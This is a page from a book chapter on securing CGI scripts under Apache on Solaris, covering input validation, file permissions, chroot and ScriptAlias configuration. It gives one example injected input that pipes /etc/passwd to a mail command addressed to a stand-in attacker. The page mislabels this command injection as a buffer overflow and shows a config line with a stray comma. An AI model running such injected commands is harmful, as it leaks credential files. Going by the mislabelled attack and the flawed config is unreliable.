- pgno: 228
  md: '# Chapter 7 • Providing Secure Web and Mail Services


    any other, C is probably more susceptible to a type of attack called a buffer
    overflow attack. In short, if you expect the user to enter 10 characters in your
    Web form, you expect the CGI to handle only 10 characters. What if the users enters
    10 characters followed by something like |cat /etc/passwd| mail evilhacker@evilhackers.org?
    If your CGI doesn''t check, or input limits, the program may very run the /cat
    /etc/passwd| mail... command, sending your password file out to the masses. Make
    no mistakes, C and Perl scripts are also vulnerable to these attacks and to others.
    The first rule of writing using CGIs is to write with security in mind. From the
    first line of code, know what the script should handle, what legitimate requests
    it should see, what requests it should reject, and how you handle bad requests
    and their subsequent rejection and logging. Once written, test, test, and test
    some more until you, your peers, and all around you are satisfied that you have
    done enough to make the script secure. Now that the script has been written, you
    need to install it securely as well.


    First, you need to restrict the resources the running CGI will access to. The
    best way to do this is to make the CGI mode 0555 (never, ever 1555 or 4555) and
    owned by a user group other than which your server runs. One case is that if you
    generate output of some sort, the CGI needs a place to write it. In this case,
    you may want to actually do all of your CGI work outside the Web tree, in a chrooted
    environment. Not only does this keep the CGI away from directory traversal attacks
    within the Web directory, but it keeps the CGI environment totally separate from
    the rest of the Solaris system. Now that the CGI has been secured for security
    and properly installed, we need to configure Apache to accept requests for the
    CGI in a secure manner.


    The httpd.conf file contains a directive ScriptAlias. Apache has to sense out
    of a request like /incoming-traveller.com/cgi-bin/getuserinfo.pl. For starters,
    we know /cgi-bin is not an absolute path on our system, but a relative path under
    the server root. In reality, /cgi-bin may be /usr/local/apache/cgi-bin. We need
    to explicitly tell Apache this (remember, it is basically deaf and dumb without
    a good httpd.conf file). In httpd.conf, we set up our CGI ScriptAlias like so:


    ```

    ScriptAlias /cgi-bin/ "/usr/local/apache/cgi-bin/",

    ```


    You may further restrict access to the CGI directory with the Directory directive,
    like so:


    ```

    <Directory "/usr/local/apache/cgi-bin">

    AllowOverride None

    ```'
